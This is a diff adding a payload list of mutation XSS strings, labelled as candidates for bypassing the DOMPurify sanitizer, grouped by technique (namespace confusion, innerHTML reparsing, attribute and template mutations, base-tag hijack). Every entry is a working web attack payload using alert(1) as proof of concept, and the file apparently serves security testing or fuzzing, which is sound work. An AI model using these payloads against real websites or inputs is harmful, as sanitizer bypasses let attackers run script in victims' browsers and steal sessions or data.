@@ -1,0 +1,26 @@
+# Mutation XSS (mXSS) — exploits DOM parsing differences between sanitizer and browser
+# DOMPurify bypass candidates (version-specific — test carefully)
+<listing><img/src=x onerror=alert(1)></listing>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<p id="</p><img src=x onerror=alert(1)>//">
+# innerHTML reparsing mutations
+<table><td><mglyph><svg><mtext><table><mglyph><svg><path></path></svg><img src=x onerror=alert(1)>
+<table><math><mi><table></table></mi><img onerror=alert(1) src></math>
+<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">
+# Namespace confusion mXSS
+<math><mi><script>alert(1)</script></mi></math>
+<svg><title><a href="javascript:alert(1)">click</a></title></svg>
+# HTML parser mutation
+<p><img alt="</p><img src=x onerror=alert(1)//">
+<p><img src=1 alt="</p><img src=x onerror=alert(1)//">
+# script tag mutation
+<script charset="\"><img src=x onerror=alert(1)">
+# Attribute name mutation
+<img [src]=x onerror=alert(1)>
+<img .src=x onerror=alert(1)>
+# Template element mutation
+<template><img src=x onerror=alert(1)></template>
+# frameset mutation
+<frameset onload=alert(1)>
+# base tag hijack (mutation after base injection)
+<base href="javascript:alert(1)//"><a href="">click</a>
